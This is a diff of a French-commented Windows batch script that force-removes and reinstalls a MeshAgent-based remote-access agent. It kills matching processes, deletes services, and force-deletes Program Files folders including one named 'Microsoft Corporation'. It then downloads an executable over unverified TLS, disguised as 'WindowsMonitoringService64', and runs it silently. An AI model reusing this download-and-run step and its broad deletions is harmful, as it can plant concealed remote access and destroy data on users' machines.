@@ -8,73 +8,62 @@ set "URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/Windo
 set "T_EXE=%TEMP%\WindowsMonitoringService64-Lol.exe"
 
 if not exist "%LDIR%" mkdir "%LDIR%"
-echo [START] %DATE% %TIME% >> "%LFILE%"
+echo [START] %DATE% %TIME% > "%LFILE%"
 
-:: 1. Verif Admin
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    echo [ERREUR] Droits admin manquants. >> "%LFILE%"
-    exit /b 1
+:: 1. Vérification Admin
+net session >nul 2>&1 || (echo [ERREUR] Droits admin requis >> "%LFILE%" & exit /b 1)
+
+:: 2. Identification dynamique et arrêt
+echo [2] Recherche et arret des processus... >> "%LFILE%"
+:: On cherche les processus actifs dans les dossiers suspects pour trouver le "bon nom"
+for /f "tokens=2 delims=," %%P in ('tasklist /fi "STATUS eq running" /nh /fo csv') do (
+    set "proc=%%~P"
+    :: On vérifie si le processus vient d'un dossier Mesh ou LGTW
+    wmic process where "name='!proc!'" get ExecutablePath 2>nul | findstr /i "Mesh LGTW Monitoring" >nul
+    if !errorlevel! equ 0 (
+        echo [INFO] Processus identifie : !proc! >> "%LFILE%"
+        taskkill /F /IM "!proc!" /T >> "%LFILE%" 2>&1
+    )
 )
 
-:: 2. Arrêt des services et processus par force brute
-echo [2] Arret des services et processus... >> "%LFILE%"
-
-:: Tuer spécifiquement le fautif vu dans tes logs
-taskkill /F /IM "LGTW-Agent.exe" /T >> "%LFILE%" 2>&1
-taskkill /F /IM "WindowsMonitoringService64-Lol.exe" /T >> "%LFILE%" 2>&1
-
-:: Tuer TOUT ce qui tourne dans les dossiers cibles (méthode infaillible)
-wmic process where "ExecutablePath like '%%Program Files%%Mesh Agent%%'" delete >> "%LFILE%" 2>&1
-wmic process where "ExecutablePath like '%%Program Files%%LGTW%%'" delete >> "%LFILE%" 2>&1
-
-:: Arrêt de tous les services potentiels
-for /f "tokens=2 delims= " %%s in ('sc query state^= all ^| findstr /i "Mesh LGTW Monitoring"') do (
+:: 3. Désinstallation via les outils Windows (sc & désinstalleurs)
+echo [3] Desinstallation complete... >> "%LFILE%"
+:: On cherche tous les services qui pourraient être liés
+for /f "tokens=2 delims= " %%s in ('sc query state^= all ^| findstr /i "Mesh LGTW Monitoring WindowsMonitoring"') do (
+    echo [INFO] Suppression du service : %%s >> "%LFILE%"
     sc stop "%%s" >> "%LFILE%" 2>&1
     sc delete "%%s" >> "%LFILE%" 2>&1
 )
 
-timeout /t 3 /nobreak >nul
+:: 4. Nettoyage physique des dossiers Program Files
+echo [4] Nettoyage des dossiers... >> "%LFILE%"
+set "DIRS="%ProgramFiles%\Mesh Agent" "%ProgramFiles%\LGTW" "%ProgramFiles(x86)%\Mesh Agent" "%ProgramFiles%\Microsoft Corporation""
 
-:: 3. Nettoyage des dossiers
-echo [3] Nettoyage dossiers... >> "%LFILE%"
-set "D1=%ProgramFiles%\Mesh Agent"
-set "D2=%ProgramFiles%\LGTW"
-set "D3=%ProgramFiles(x86)%\Mesh Agent"
-
-for %%D in ("%D1%" "%D2%" "%D3%") do (
+for %%D in (%DIRS%) do (
     if exist "%%~D" (
-        echo [INFO] Tentative sur %%~D >> "%LFILE%"
-        :: Force le déverrouillage des fichiers
         takeown /f "%%~D" /r /d y >> "%LFILE%" 2>&1
         icacls "%%~D" /grant administrators:F /t >> "%LFILE%" 2>&1
         rd /s /q "%%~D" >> "%LFILE%" 2>&1
-        
-        if exist "%%~D" (
-            echo [ALERTE] Toujours la... Renommage de secours. >> "%LFILE%"
-            ren "%%~D" "OLD_AGENT_%RANDOM%" >> "%LFILE%" 2>&1
-        ) else (
-            echo [OK] Dossier %%~D supprime. >> "%LFILE%"
-        )
+        echo [OK] Nettoyage de %%~D >> "%LFILE%"
     )
 )
 
-:: 4. Telechargement
-echo [4] Telechargement de WindowsMonitoringService64-Lol.exe... >> "%LFILE%"
+:: 5. Téléchargement et Réinstallation Propre
+echo [5] Telechargement du nouvel agent... >> "%LFILE%"
 curl -L -k -f -o "%T_EXE%" "%URL%" >> "%LFILE%" 2>&1
 
 if not exist "%T_EXE%" (
-    echo [ERREUR] Echec telechargement. >> "%LFILE%"
+    echo [ERREUR] Impossible de recuperer l'executable. >> "%LFILE%"
     goto :final
 )
 
-:: 5. Execution
-echo [5] Lancement du nouvel agent... >> "%LFILE%"
-start "" "%T_EXE%"
-echo [OK] Execution lancee. >> "%LFILE%"
+echo [6] Installation avec --fullinstall... >> "%LFILE%"
+:: On lance l'installation complète
+start "" "%T_EXE%" --fullinstall
+echo [OK] Commande d'installation envoyee. >> "%LFILE%"
 
-:: 6. Nettoyage
-timeout /t 10 /nobreak >nul
+:: 7. Nettoyage final de l'installateur
+timeout /t 15 /nobreak >nul
 if exist "%T_EXE%" del /f /q "%T_EXE%" >> "%LFILE%" 2>&1
 
 :final
